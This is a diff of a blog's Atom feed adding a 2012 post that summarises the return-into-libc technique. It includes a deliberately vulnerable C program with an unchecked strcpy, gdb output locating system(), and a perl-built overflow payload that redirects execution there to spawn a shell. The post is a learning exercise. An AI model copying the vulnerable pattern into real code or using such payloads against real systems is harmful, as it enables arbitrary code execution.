@@ -4,7 +4,7 @@
   <title><![CDATA[Category: great papers | Doing things]]></title>
   <link href="http://khakimov.github.com/blog/categories/great-papers/atom.xml" rel="self"/>
   <link href="http://khakimov.github.com/"/>
-  <updated>2012-11-25T20:50:28-08:00</updated>
+  <updated>2012-12-02T15:37:20-08:00</updated>
   <id>http://khakimov.github.com/</id>
   <author>
     <name><![CDATA[khakimov]]></name>
@@ -12,6 +12,62 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Return-into-libc without Function Calls]]></title>
+    <link href="http://khakimov.github.com/blog/2012/12/02/return-into-libc-without-function-calls/"/>
+    <updated>2012-12-02T14:12:00-08:00</updated>
+    <id>http://khakimov.github.com/blog/2012/12/02/return-into-libc-without-function-calls</id>
+    <content type="html"><![CDATA[<p>Since OpenBSD has a nonexecutable stack by default and you can also patch your Linux kernel and make nonexecutable stack through PaX, AMD and Intel recently added to their processors a per-page execute disable bit to ease WOX implementation and even Microsoft implement WOX (no location in memory into which the attacker can inject code to execute, or just imagine no memory location in a process image is marked both writable - W and executable - X) all it means you can not write into stack and execute your shellcode.</p>
+
+<p>Today I read about technique is known as <strong>return into libc</strong> by <a href="http://cseweb.ucsd.edu/~hovav/">Hovav Shacham</a> (btw, his Ph.D. advisor was professor of Computer Science and Electrial Engineering at Stanford <a href="http://crypto.stanford.edu/~dabo/">Dan Boneh</a>. I took his CS155 class, he is really good in his field).</p>
+
+<p>What is this about? If we can't write in stack what should we do? We can't inject code, so, we will use coe that already exists in the proccess image we are attacking. It is <strong>libc</strong> is the usual target that contains various basic functions, such as printf() and exit(). These functions are share, so any program that uses the printf() function directs execution into the appropriate location in libc. And attacker with his explout can do the same thing and direct a program's execution into a certain function in libc. But in principle any available code, either from the program's text segment of from a library it links to, could be used instead libc.</p>
+
+<p>Enjoy!</p>
+
+<p><a title="View Geometry (1) on Scribd" href="http://www.scribd.com/doc/115228599/Geometry-1" style="margin: 12px auto 6px auto; font-family: Helvetica,Arial,Sans-serif; font-style: normal; font-variant: normal; font-weight: normal; font-size: 14px; line-height: normal; font-size-adjust: none; font-stretch: normal; -x-system-font: none; display: block; text-decoration: underline;">Geometry (1)</a><iframe class="scribd_iframe_embed" src="http://www.scribd.com/embeds/115228599/content?start_page=1&view_mode=scroll&access_key=key-1qjla86da9zi8xelaiqr" data-auto-height="false" data-aspect-ratio="0.772727272727273" scrolling="no" id="doc_22341" width="100%" height="600" frameborder="0"></iframe></p>
+
+<p>I played a litle bit with <strong>return into libc</strong> and the main idea was to force the program to spawn a shell without executing anything on the stack, by returning int the libc function system().</p>
+
+<p><code>c sys.c
+int main(int argc, char *argv[])
+{
+   char buffer[5];
+   strcpy(buffer, argv[1]);
+   return 0;
+}
+</code></p>
+
+<p><code>c tmp.c
+int main()
+{ system(); }
+</code></p>
+
+<p>```
+rus@rus-desktop:/tmp $ gcc -o t tmp.c
+rus@rus-desktop:/tmp $ gdb -q ./t
+(gdb) break main
+Breakpoint 1 at 0x804837a
+(gdb) run
+Starting program: /tmp/t</p>
+
+<p>Breakpoint 1, 0x0804837a in main ()
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7ed0d80 <system>
+(gdb) quit
+```</p>
+
+<p>here we got address of function <strong>system()</strong> and it is located at <strong>0xb7ed0d80</strong>.</p>
+
+<p><code>
+rus@rus-desktop:/tmp $ ./a.out $(perl -e 'print "AAAA"x7 . "\x80\x0d\xed\xb7"')
+sh: ????????: command not found
+Segmentation fault
+</code>
+7 words of data are used for spacin in the exploit and then we call system() as you can see. In this example I don't pass any arguments, but it's should be of course "/bin/sh". That's my Sunday and happy hacking hours!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Buffer Overflow]]></title>
